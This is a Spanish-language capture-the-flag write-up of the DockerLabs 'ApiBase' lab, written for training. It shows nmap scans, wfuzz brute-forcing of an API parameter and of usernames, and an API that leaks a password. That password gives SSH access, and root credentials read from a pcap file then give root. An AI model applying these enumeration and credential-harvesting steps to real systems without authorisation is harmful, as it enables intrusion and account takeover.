---
title: DockerLabs - ApiBase
summary: "Write-up del laboratorio ApiBase de DockerLabs"
author: elcybercurioso
date: 2025-11-04
categories: [Post, DockerLabs]
tags: [fácil, api, brute force, privesc, credentials leaking]
media_subpath: "/assets/img/posts/dockerlabs_apibase"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ApiBase]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ApiBase]
└─$ nmap -sCV -p22,5000 172.17.0.2                              
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u4 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:ab:09:61:00:7b:cc:18:48:8e:bf:8d:3d:e4:cd:b5 (RSA)
|   256 42:0c:71:44:7c:13:ba:8f:b7:82:35:f2:b3:f7:b9:ff (ECDSA)
|_  256 85:95:6c:96:ac:a1:f0:3e:1e:0d:c1:c8:b0:6f:bb:1d (ED25519)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.2)
|_http-title: Site doesn´t have a title (application/json).
|_http-server-header: Werkzeug/1.0.1 Python/3.9.2
```

## análisis

Revisando la página principal del puerto 5000 del servidor web, nos encontramos con una API (Application Programming Interface), la cual nos indica que podemos añadir un usuario, o listar datos de otros usuarios existentes:

![Desktop View](/20251103194227.webp){: width="972" height="589" .shadow}

Comprobamos que para agregar, se debe realizar mediante el método `POST`:

![Desktop View](/20251103194245.webp){: width="972" height="589" .shadow}

![Desktop View](/20251103194748.webp){: width="972" height="589" .shadow}

Sin embargo, cuando vamos a comprobar nuestro usuario, vemos que para ello es necesario aportar un parámetro, el cual todavía no tenemos:

![Desktop View](/20251103194302.webp){: width="972" height="589" .shadow}

## explotación

Tratamos de obtener el parámetro por fuerza bruta con `wfuzz`:

```bash
──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ApiBase]
└─$ wfuzz -c -t 200 --hh=35 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2:5000/users?FUZZ=key"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz`s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2:5000/users?FUZZ=key
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000003829:   404        3 L      6 W        32 Ch       "username"
```

Vemos que ahora con el parámetro `username` sí podemos listar la información:

![Desktop View](/20251103225112.webp){: width="972" height="589" .shadow}

Dado que tenemos una forma de listar usuarios, vamos a ver que otros usuarios hay disponibles, ya que al parecer, no solo se muestra el usuario, sino también la contraseña asignada:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ApiBase]
└─$ wfuzz -c -t 200 --hh=32 -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u "http://172.17.0.2:5000/users?username=FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz`s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2:5000/users?username=FUZZ
Total requests: 8295455

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000047743:   200        12 L     12 W       104 Ch      "pingu" 
```

Si listamos al usuario `pingu`, encontramos una cadena que podría ser la contraseña:

![Desktop View](/20251103225442.webp){: width="972" height="589" .shadow}

Probamos a acceder con las credenciales obtenidas, y vemos que son correctas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ApiBase]
└─$ ssh pingu@172.17.0.2                                                 
pingu@172.17.0.2's password: 
pingu@ad346bb3cda2:~$ whoami
pingu
pingu@ad346bb3cda2:~$ hostname -I
172.17.0.2
```

Comprobamos que en fichero `users.db` del directorio del usuario `pingu` el único que se muestra es este mismo:

```bash
pingu@ad346bb3cda2:/home$ ls  
app.py  network.pcap  pingu  users.db
pingu@ad346bb3cda2:/home$ sqlite3 users.db 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|pingu|pi*********
```

## escalada de privilegios

En la carpeta del usuario `pingu` encontramos también un fichero con extensión `.pcap`, el cual si revisamos su contenido, encontramos lo que se podría interpretar como las credenciales del usuario `root`, por lo que las probamos para ver si es así:

```bash
pingu@ad346bb3cda2:/home$ cat /home/network.pcap
�ò����&�gVF((E(@"���P .�&�g@G((E(@O��P [�&�g�G((E(@"���P .�&�g3H33E3@"���P aRLOGIN root
&�g
   I66E6@"���P ��PASS b*******
&�g�I66E6@O��P ��Access Denied
pingu@ad346bb3cda2:/home$ su root
Password: 
root@ad346bb3cda2:/home# whoamio
bash: whoamio: command not found
root@ad346bb3cda2:/home# whoami 
root
```

Con esto, habremos completado el laboratorio!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>